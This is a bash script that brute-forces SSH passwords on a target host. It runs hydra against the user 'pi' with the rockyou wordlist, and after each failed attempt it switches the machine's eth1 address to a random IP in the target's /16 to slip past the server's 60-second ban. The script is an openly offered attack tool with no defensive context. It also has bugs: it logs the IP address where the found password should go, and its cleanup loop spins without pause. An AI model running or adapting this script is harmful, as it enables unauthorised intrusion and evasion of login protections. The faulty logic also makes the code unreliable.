#!/bin/bash
#if used_ip.txt does not exist, create it
if [ ! -f used_ip.txt ]; then
    touch used_ip.txt
fi
#check if target is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi
#get target value
TARGET=$1
#get subnet of target
SUBNET=$(echo $TARGET | cut -d '.' -f 1-2)

#get ip address of eth1
MY_IP=$(ifconfig eth1 | grep "inet " | awk '{print $2}')

#add ip address to used_ip.txt
echo $MY_IP > used_ip.txt

#check if used_ip.txt has any ip addresses older than 60 seconds
#and remove them 60 correspond of ban time of ssh server
check_ip_file () {
    while true; do
        current_time=$(date +%s)
        while read line; do
            ip=$(echo $line | awk '{print $1}')
            timestamp=$(echo $line | awk '{print $2}')
            if [ $((current_time - timestamp)) -gt 60 ]; then
                sed -i "/$ip/d" used_ip.txt
            fi
        done < "used_ip.txt"
    done
}

#start check_ip_file in background
check_ip_file &
#start loop

while true; do
    #get random ip address from subnet /16 
    IP=$(echo $SUBNET).$((RANDOM%255)).$((RANDOM%255))
    
    #check if ip address is not in used_ip.txt
    if ! grep -q $IP used_ip.txt; then
        echo "IP address $IP is not used, trying to crack SSH"

        #start hydra in background
        hydra -l pi -P /usr/share/wordlists/rockyou.txt ssh://$TARGET  &
        PID=$!
        trap "kill $PID; exit 0" INT

        #add ip address to used_ip.txt
        echo $IP $(date +%s) >> used_ip.txt
        # if hydra found password, kill hydra and note password in a txt file and exit
        wait $PID
        if [ $? -eq 0 ]; then
            echo "Password found: $IP"
            echo "Password found: $IP" >> password.txt
            exit 0
        fi

        # if not change ip address of eth1 by IP
        ifconfig eth1 $IP
        echo "IP address changed to $IP"
    fi
done


